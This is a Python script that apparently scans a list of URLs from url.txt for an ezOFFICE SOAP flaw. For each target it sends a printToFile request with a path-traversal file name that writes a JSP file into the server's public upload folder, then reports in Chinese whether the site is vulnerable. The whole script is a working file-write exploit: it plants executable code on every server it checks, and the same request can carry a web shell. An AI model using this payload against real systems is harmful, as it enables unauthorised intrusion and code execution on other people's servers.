import requests

def check_vulnerability(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
        'Content-Type': 'text/xml;charset=UTF-8',
        'SOAPAction': '""'
    }
    payload = '''
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
        <soapenv:Header/>
        <soapenv:Body>
            <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/fyhoyuoq8b.jsp.</fileName>
                <content xsi:type="soapenc:string">&lt;% out.print(1234*1234);%&gt;</content>
            </util:printToFile>
        </soapenv:Body>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, headers=headers, data=payload)
        if response.status_code == 200 and 'printToFileResponse' in response.text:
            print(f"URL {url} 存在漏洞")
        else:
            print(f"URL {url} 不存在漏洞")
    except requests.exceptions.RequestException as e:
        print(f"URL {url} 请求发生错误: {str(e)}")

# 读取url.txt文件
with open('url.txt', 'r') as file:
    urls = file.read().splitlines()

# 循环遍历URL并进行检测
for url in urls:
    check_vulnerability(url)